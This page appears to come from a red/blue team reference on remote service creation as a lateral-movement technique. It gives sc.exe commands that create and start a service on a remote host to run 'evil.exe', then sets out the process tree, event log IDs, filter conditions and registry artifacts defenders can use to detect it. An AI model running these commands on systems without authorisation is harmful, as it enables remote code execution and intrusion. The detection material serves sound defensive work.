# Services

## Requirement

| Subject   | Value                         |
| --------- | ----------------------------- |
| Port      | 139                           |
| Authority | Administrators, Domain Admins |
| Service   | -                             |

## <mark style="color:red;">RedTeam</mark> <a href="#remote-service-creation" id="remote-service-creation"></a>

### **sc.exe**

```powershell
# Create 'Evil' service on '10.0.77.130' which this serivce set to run 'evil.exe'
sc \\10.0.77.130 create Evil binpath= "C:\windows\temp\evil.exe"

# Start 'Evil' service
sc \\10.0.77.130 start Evil
```

## <mark style="color:blue;">BlueTeam</mark>

### Process Tree (target host)

* services.exe
  * evil.exe

### Event Logs (source host)

| Source        | Event ID                                               | Condition                                                                                                 | Focus On                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------- | ------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security.evtx | 4648: A logon was attempted using explicit credentials | Process Information\Process Name == \*sc.exe                                                              | <p><strong>Target IP</strong><br><strong></strong>(Network Information\Network Address)<br><br><strong>Target Server Name</strong><br><strong></strong>(Target Server\Target Server Name)</p>                                                                                                                                                                                                                                                                                                                        |
| Security.evtx | 4688: A new process has been created                   | Process Information\New Process Name == \*sc.exe AND Process Information\Process Command Line == \*\\\\\* | <p><strong>Parent Process ID</strong><br><strong></strong>(Process Information\Creator Process ID)<br><br><strong>Parent Process</strong><br><strong></strong>(Process Information\Creator Process Name)<br><br><strong>Process ID</strong><br><strong></strong>(Process Information\New Process ID)<br><br><strong>Process Name</strong><br><strong></strong>(Process Information\New Process Name)<br><br><strong>Process Command Line</strong><br><strong></strong>(Process Information\Process Command Line)</p> |

### Event Logs (target host)

| Source        | Event ID                                    | Condition                              | Focus On                                                                                                                                                                                                                                                  |
| ------------- | ------------------------------------------- | -------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security.evtx | 4624: An account was successfully logged on | Logon Type == 3                        | <p><strong>Source IP</strong><br><strong></strong>(Network Information\Source Network Address)<br><br><strong>Account Domain</strong><br><strong></strong>(New Logon\Account Domain)<br><br><strong>Account Name</strong><br>(New Logon\Account Name)</p> |
| Security.evtx | 4688: A new process has been created        | Creator Process Name == \*services.exe | <p><strong>Process Name</strong><br><strong></strong>(Process Information\New Process Name Process)<br><br><strong>Command Line</strong><br><strong></strong>(Information\Process Command Line)</p>                                                       |
| System.evtx   | 7045: A service was installed in the system | -                                      | <p><strong>Service Name</strong><br><strong></strong>(Service Name)<br><br><strong>Service File Name</strong><br><strong></strong>(Service File Name)</p>                                                                                                 |

### Artifacts

| Type     | Location                                           |
| -------- | -------------------------------------------------- |
| Registry | SYSTEM\CurrentControlSet\Services\\\<Service Name> |
